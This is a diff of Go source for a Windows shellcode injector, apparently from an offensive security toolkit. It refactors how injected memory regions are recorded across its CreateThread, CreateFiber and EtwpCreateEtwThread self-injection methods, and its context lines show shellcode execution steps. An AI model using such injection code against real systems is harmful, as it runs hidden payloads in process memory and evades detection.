@@ -20,19 +20,12 @@ const (
 // context64 is a local alias for api.Context64 (x64 thread context).
 type context64 = api.Context64
 
-// windowsInjector implements injection for Windows.
+// windowsInjector implements injection for Windows. The embedded
+// regionRecorder provides InjectedRegion() to satisfy SelfInjector;
+// self-process methods call record(addr, size) on success.
 type windowsInjector struct {
-	config     *Config
-	lastRegion Region
-	hasRegion  bool
-}
-
-// InjectedRegion returns the base address and size of the region allocated
-// by the most recent successful self-process Inject (MethodCreateThread,
-// MethodCreateFiber, MethodEtwpCreateEtwThread). For cross-process methods
-// or before the first successful self Inject, returns (Region{}, false).
-func (w *windowsInjector) InjectedRegion() (Region, bool) {
-	return w.lastRegion, w.hasRegion
+	config *Config
+	regionRecorder
 }
 
 func newPlatformInjector(cfg *Config) (Injector, error) {
@@ -185,8 +178,7 @@ func (w *windowsInjector) injectCreateThread(shellcode []byte) error {
 	api.ProcWaitForSingleObject.Call(hThread, 100)
 	windows.CloseHandle(windows.Handle(hThread))
 
-	w.lastRegion = Region{Addr: addr, Size: uintptr(len(encoded))}
-	w.hasRegion = true
+	w.record(addr, uintptr(len(encoded)))
 	return nil
 }
 
@@ -464,8 +456,7 @@ func (w *windowsInjector) injectCreateFiber(shellcode []byte) error {
 	// 4. Switch to shellcode Fiber (execution!)
 	api.ProcSwitchToFiber.Call(shellcodeFiber)
 
-	w.lastRegion = Region{Addr: addr, Size: uintptr(len(shellcode))}
-	w.hasRegion = true
+	w.record(addr, uintptr(len(shellcode)))
 	return nil
 }
 
@@ -501,8 +492,7 @@ func (w *windowsInjector) injectEtwpCreateEtwThread(shellcode []byte) error {
 		return fmt.Errorf("EtwpCreateEtwThread failed")
 	}
 
-	w.lastRegion = Region{Addr: addr, Size: uintptr(len(shellcode))}
-	w.hasRegion = true
+	w.record(addr, uintptr(len(shellcode)))
 	return nil
 }
 
